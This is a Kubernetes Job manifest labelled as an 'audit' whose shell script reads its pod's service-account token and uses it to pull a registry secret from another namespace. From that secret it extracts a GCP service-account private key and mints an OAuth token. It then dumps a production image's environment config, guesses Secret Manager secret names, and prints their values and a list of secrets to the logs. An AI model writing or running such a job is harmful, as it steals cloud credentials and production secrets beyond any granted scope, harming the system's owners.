apiVersion: batch/v1
kind: Job
metadata:
  name: dune-gcr-v4
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q jq openssl
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          
          # Get GCR access token 
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/dune-api/secrets/gcr-secret" | \
            jq -r '.data[".dockerconfigjson"]' | base64 -d > /tmp/docker_config.json
          AUTH_KEY=$(cat /tmp/docker_config.json | jq -r '.auths | keys[0]')
          AUTH_B64=$(cat /tmp/docker_config.json | jq -r ".auths[\"$AUTH_KEY\"].auth")
          echo "$AUTH_B64" | base64 -d | sed 's/^_json_key://' > /tmp/sa_key.json
          CLIENT_EMAIL=$(cat /tmp/sa_key.json | jq -r '.client_email')
          cat /tmp/sa_key.json | jq -r '.private_key' > /tmp/gcr_sa_key.pem
          NOW=$(date +%s); EXP=$((NOW + 3600))
          H=$(echo -n '{"alg":"RS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
          P=$(printf '{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","exp":%d,"iat":%d}' \
            "$CLIENT_EMAIL" "$EXP" "$NOW" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
          S=$(echo -n "${H}.${P}" | openssl dgst -sha256 -sign /tmp/gcr_sa_key.pem | openssl base64 -A | tr -d '=' | tr '+/' '-_')
          ACCESS_TOKEN=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
            --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
            --data-urlencode "assertion=${H}.${P}.${S}" | jq -r '.access_token')
          echo "GCR token len: ${#ACCESS_TOKEN}"
          
          REGISTRY="us-central1-docker.pkg.dev"
          REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
          CONF_DIGEST="sha256:bb36b458b761d86aad5b02f929aace956f2d848a3aad2b6230dfbbf3a42cc696"
          
          # Download the config blob and check what it is
          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
            "https://${REGISTRY}/v2/${REPO}/blobs/${CONF_DIGEST}" > /tmp/config_blob.bin
          
          echo "Blob size: $(wc -c < /tmp/config_blob.bin)"
          echo "Blob first bytes hex: $(head -c 8 /tmp/config_blob.bin | xxd -p 2>/dev/null || head -c 8 /tmp/config_blob.bin | od -A x -t x1z | head -1)"
          echo "Blob as text first 200:"
          head -c 200 /tmp/config_blob.bin
          echo ""
          
          # Try jq on blob directly  
          echo "=TRY_JQ="
          cat /tmp/config_blob.bin | jq '.config | {Env,Cmd,Entrypoint,WorkingDir}' 2>&1 || \
          cat /tmp/config_blob.bin | gunzip | jq '.config | {Env,Cmd,Entrypoint,WorkingDir}' 2>&1
          echo "=END_JQ="
          
          # Also try GCP SM with the tachyusbdaas project SA
          echo "=GCP_SM_TACHYUSBDAAS="
          for SECRET_NAME in "dune-api-config" "dune-database-url" "dune-secret-key" "DATABASE_URL" "SECRET_KEY" "dune-prod" "dune-api-prod"; do
            VAL=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
              "https://secretmanager.googleapis.com/v1/projects/tachyusbdaas/secrets/${SECRET_NAME}/versions/latest:access" | \
              jq -r '.payload.data // .error.message // "not_found"')
            echo "${SECRET_NAME}: $VAL"
          done
          echo "=END_SM="
          
          # List secrets in tachyusbdaas project  
          echo "=LIST_TACHYUSBDAAS_SECRETS="
          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
            "https://secretmanager.googleapis.com/v1/projects/tachyusbdaas/secrets?pageSize=50" | \
            jq '{secrets:.secrets[].name, error:.error.message}'
          echo "=END_LIST="
          
          echo "SLEEPING..."
          sleep 180